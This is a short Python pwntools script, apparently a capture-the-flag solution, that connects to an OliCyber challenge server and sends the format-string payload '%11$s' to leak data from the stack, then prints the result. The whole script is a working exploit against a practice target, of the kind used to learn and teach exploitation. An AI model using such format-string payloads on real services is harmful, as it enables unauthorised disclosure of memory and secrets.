from pwn import *

r = remote("scotti.challs.olicyber.it", 12202)

r.sendlineafter(b"risposta? ", b"%11$s")
r.recvline()

print(r.recvline().decode().strip())